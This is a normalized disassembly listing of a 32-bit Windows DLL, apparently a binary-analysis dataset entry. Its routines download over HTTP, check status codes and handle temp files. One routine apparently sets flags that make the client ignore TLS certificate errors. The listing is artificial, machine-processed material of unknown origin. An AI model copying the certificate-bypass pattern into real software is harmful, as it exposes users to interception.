mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x84 ] 0x7
mov [ ebp - 0x88 ] eax
call sub_1001c310
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0xec ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ ebp - 0xb4 ]
call sub_10057df0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000c1e0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xa0 ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ ebp - 0x98 ]
push eax
call sub_10065045
add esp 0x4
cmp [ ebp - 0x84 ] 0x8
mov eax [ ebp - 0x98 ]
jae r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x25
call sub_100328b0
lea edx [ ebp - 0x7c ]
mov eax 0x2a
call sub_100328b0
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x7c ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] esi
mov [ ebp - 0xc8 ] edi
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_10065045
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebx + 0xb0 ]
mov edx [ ebp - 0xbc ]
neg ecx
sbb ecx ecx
and ecx 0x800000
push ecx
mov ecx [ ebx + 0xe0 ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0xbc ]
push edx
push eax
call ecx
mov esi eax
mov [ ebp - 0xbc ] esi
test esi esi
jne r-xdata
lea eax [ ebp - 0x98 ]
mov eax [ ebx + 0xc8 ]
push 0x4
lea edx [ ebp - 0xd4 ]
push edx
push 0x3f
mov edi 0x2
push esi
mov [ ebp - 0xd4 ] edi
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x1
jmp r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov [ ebp - 0xb8 ] edi
jmp r-xdata
mov esi [ ebp - 0xc0 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebx + 0x6c ]
lea ecx [ ebx + 0x5c ]
push r--data
xor edi edi
call sub_1005e510
test eax eax
je r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov ecx [ ebx + 0xd4 ]
push esi
call ecx
cmp [ ebp - 0xb8 ] 0x0
je r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0xd0 ]
mov [ esi ] 0x0
mov [ edx ] 0x0
mov eax [ ebp - 0xc8 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ebp - 0xc4 ]
push 0x0
push eax
push eax
mov eax [ ebx + 0xe4 ]
push ecx
push 0xffffffff
push edx
push esi
call eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x88 ]
lea ecx [ ebx + 0x78 ]
push r--data
call sub_1005e510
test eax eax
je r-xdata
mov edx [ ebx + 0xc8 ]
push 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push 0x1f
push esi
mov [ ebp - 0xe0 ] 0x3100
call edx
mov eax [ ebp - 0xb8 ]
mov eax [ ebp - 0x98 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebx + 0xe8 ]
push 0x0
push esi
call ecx
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x4
jmp r-xdata
lea edi [ ebx + 0x94 ]
mov ecx edi
call sub_1001a770
test al al
je r-xdata
mov edi [ ebp - 0xd8 ]
mov eax [ ebx + 0xd8 ]
push 0x0
lea edx [ ebp - 0xdc ]
push edx
push edi
push 0x0
push 0x20000013
push esi
mov [ ebp - 0xdc ] 0x4
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x5
jmp r-xdata
mov ecx 0x8
cmp [ edi + 0x14 ] ecx
jb r-xdata
cmp [ edi ] 0x12e
je r-xdata
mov [ ebp - 0xb8 ] 0x6
jmp r-xdata
cmp [ ebx + 0x8c ] ecx
lea eax [ ebx + 0x78 ]
jb r-xdata
mov edi [ edi ]
mov edi [ ebp - 0xc0 ]
push esi
mov esi [ ebp - 0xd0 ]
call sub_1005ad00
mov esi [ ebp - 0xbc ]
mov [ ebp - 0xb8 ] eax
push 0x0
push edi
push eax
mov eax [ ebx + 0xcc ]
push 0x1
push 0x1
push esi
call eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0xb8 ] 0x3
jmp r-xdata
sub_1000cd40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100815a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x268
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x278 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
push 0x208
mov [ esp + 0x1c ] eax
mov ebx ecx
mov ecx [ ebp + 0x18 ]
lea eax [ esp + 0x68 ]
push 0x0
push eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x34 ] edx
call sub_10078970
add esp 0xc
cmp [ ebx + 0x2e4 ] 0x0
mov [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax 0x64
jmp r-xdata
push esi
mov ecx edi
lea esi [ esp + 0x4c ]
call sub_10057df0
add esp 0x4
mov esi eax
lea eax [ ebx + 0x2c4 ]
lea edi [ esp + 0x2c ]
mov [ esp + 0x280 ] 0x0
call sub_10009500
mov esi 0x8
mov [ esp + 0x280 ] 0x2
cmp [ esp + 0x5c ] esi
jb r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx ] 0xc8
mov eax 0x6
jmp r-xdata
mov ecx [ esp + 0x278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x260 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x18
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x28 ]
xor eax eax
mov [ ecx ] eax
mov [ edx ] eax
mov [ esp + 0x48 ] ax
mov [ edi ] eax
lea eax [ esp + 0x64 ]
push eax
push 0x0
push r--data
lea ecx [ ebx + 0xb8 ]
push ecx
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x68 ] 0x0
call [ GetTempFileNameW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov eax [ esp + 0x2c ]
mov [ esp + 0x20 ] r--data
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x40 ] esi
jae r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
mov edx [ ebx + 0x2e0 ]
push 0x0
lea ecx [ esp + 0x6c ]
push ecx
push eax
push 0x0
call edx
test eax eax
jns r-xdata
lea eax [ esp + 0x2c ]
cmp [ esp + 0x64 ] 0x0
je r-xdata
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ esp + 0x64 ]
push ecx
call [ DeleteFileW@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
lea eax [ esp + 0x7c ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov esi [ Sleep@IAT ]
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esi ]
test eax eax
je r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ edi ] eax
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
push 0x3e8
call esi
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax ebx
mov edx [ esp + 0x2c ]
push edx
call sub_10065045
add esp 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov [ edi ] 0x0
mov [ esp + 0x10 ] 0x4
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esp + 0x14 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
mov [ ecx ] eax
mov ecx [ edi ]
push ecx
push eax
push esi
mov [ esp + 0x30 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
mov edx [ edi ]
cmp edx [ esp + 0x1c ]
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
mov [ eax ] 0xc8
jmp r-xdata
sub_1000d005
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10064eda
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1000d0b0
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
inc eax
cmp eax 0x28
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x3e
call sub_1000a6f0
mov ecx [ esi + 0x20 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov [ esi + 0x20 ] 0x0
xor eax eax
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0xe4
call sub_1000a6f0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000d124
push 0xc
push r--data
call sub_10078b50
call sub_10044fed
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d1bf
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10078b95
retn
push 0x20
call sub_1003fa9e
cmp esi rw-data
je r-xdata
push esi
call sub_10020a90
pop ecx
sub_1000d1d0
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xb0 ]
lea edx [ ebp - 0xb8 ]
mov esi ecx
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb0 ] ebx
call sub_100263e0
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax 0xd
mov [ ebp - 0xbc ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0xbc ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa8 ]
lea eax [ ebx + 0x79 ]
call sub_1000a6f0
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x104
mov [ ebp - 0xb4 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0xb4 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov edx [ ebp - 0xb8 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xb0 ]
push eax
call esi
mov ecx [ ebp - 0xb4 ]
push ecx
call esi
mov edx [ ebp - 0xac ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x2c ]
mov eax 0x2d
mov [ ebp - 0xac ] ebx
call sub_1000a6f0
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0x2c ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
push 0x18
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ebx 0x4
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xac ]
push ecx
call sub_1000eb90
mov edx [ ebp - 0xb4 ]
mov ecx [ ebp - 0xb0 ]
add esp 0x4
push edx
mov edx [ ebp - 0xb8 ]
push ecx
mov ecx [ ebp - 0xbc ]
push edx
call sub_10031a50
jmp r-xdata
mov ecx [ ebp - 0xc0 ]
mov [ ecx ] eax
sub_1000d347
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_1003cede
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1000d380
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
mov ecx esi
call sub_10028640
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edx
lea edx [ ebp - 0x4 ]
push edx
mov ecx esi
call sub_1003b0e0
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] ecx
jmp r-xdata
nop
mov ecx eax
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1000d420
push ebp
mov ebp esp
push 0xffffffff
push sub_10080975
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor eax eax
cmp [ ebx + 0xec ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x1000
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x104 ] eax
jbe r-xdata
mov eax 0x42
jmp r-xdata
push 0x3
lea esi [ ebp - 0x100 ]
mov edi ebx
call sub_10042df0
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x64 ] al
call sub_1005d090
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x100 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0x64 ]
call sub_1001ad10
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
jne r-xdata
push r--data
call sub_1003b4a6
push esi
push ebx
lea eax [ ebp - 0x100 ]
call sub_1002a5c0
mov ecx [ esi + 0x10 ]
mov edx [ ebx + 0x50 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x114 ] ecx
cmp edi 0x1
ja r-xdata
push r--data
call sub_1003b4a6
mov eax [ esi + 0x2c ]
mov [ ebp - 0x110 ] eax
cmp edi 0x2
ja r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebx + 0x108 ]
mov eax [ esi + 0x48 ]
add ecx 0x7
lea eax [ eax + ecx * 2 ]
add eax ecx
add eax [ ebp - 0x110 ]
mov ecx [ ebp + 0xc ]
add eax [ ebp - 0x114 ]
add eax edx
cmp ecx eax
ja r-xdata
push r--data
call sub_1003b4a6
sub ecx eax
push ecx
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x120 ] ecx
call sub_1005ceb0
push eax
lea eax [ ebp - 0xd4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10025a80
add esp 0xc
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x50 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp eax 0x1
ja r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_1005e370
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10065045
add esp 0x4
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x100 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xd4 ]
call sub_1001ad10
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x114 ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0xb8 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x5
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xdc ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xdc ] 0xf
mov [ ebp - 0xe0 ] 0x0
mov [ ebp - 0xf0 ] 0x0
cmp ecx 0x2
ja r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x100 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xb8 ]
call sub_1001ad10
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_1002a5c0
mov ecx [ ebp - 0x11c ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
mov [ ebp - 0x110 ] eax
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x8
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x9
call sub_1000c8b0
mov ecx eax
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1003b4a6
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10040f60
mov edi 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xb
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xc
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x110 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xe
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xf
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x10
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x80 ]
push ecx
lea edi [ ebp - 0x100 ]
call sub_10005d00
mov [ ebp - 0x4 ] 0x11
mov eax [ ebp - 0x80 ]
xor edi edi
mov esi 0x10
mov [ ebp - 0x118 ] edi
cmp [ ebp - 0x6c ] esi
jae r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_10065045
add esp 0x4
mov ebx [ ebx + 0xec ]
mov edx [ ebx ]
mov edx [ edx + 0x8 ]
lea ecx [ ebp - 0x108 ]
push ecx
lea ecx [ ebp - 0x104 ]
push ecx
lea ecx [ ebp - 0x118 ]
push ecx
mov ecx [ ebp - 0x70 ]
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx ebx
call edx
test eax eax
jne r-xdata
lea eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] 0x3
cmp [ ebp - 0x118 ] 0xc8
jne r-xdata
cmp [ ebp - 0x6c ] esi
jb r-xdata
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x104 ] edi
mov ecx [ ebp - 0x104 ]
cmp ecx edi
je r-xdata
mov ebx 0x10
mov esi 0xf
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] 0x0
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x10c ] 0x4
jmp r-xdata
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] 0x0
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_10065045
add esp 0x4
cmp ecx edi
je r-xdata
mov eax [ ebp - 0x108 ]
mov dl [ eax + ecx - 0x1 ]
cmp dl 0xa
je r-xdata
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] 0x0
cmp [ ebp - 0x50 ] ebx
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_10065045
add esp 0x4
mov [ eax + ecx - 0x1 ] 0x0
mov eax [ ebp - 0x108 ]
mov ecx [ ebp - 0x104 ]
dec eax
mov [ ebp - 0x108 ] eax
cmp dl 0x20
jne r-xdata
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] 0x0
call sub_1005e370
mov eax [ ebp - 0x10c ]
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
cmp [ ebp - 0x120 ] eax
je r-xdata
push ecx
lea ecx [ ebp - 0x108 ]
call sub_1000f000
mov ecx [ ebp - 0x104 ]
mov eax [ ebp - 0x108 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x10c ] 0x5
jmp r-xdata
sub_1000dc3a
mov edi edi
push ebp
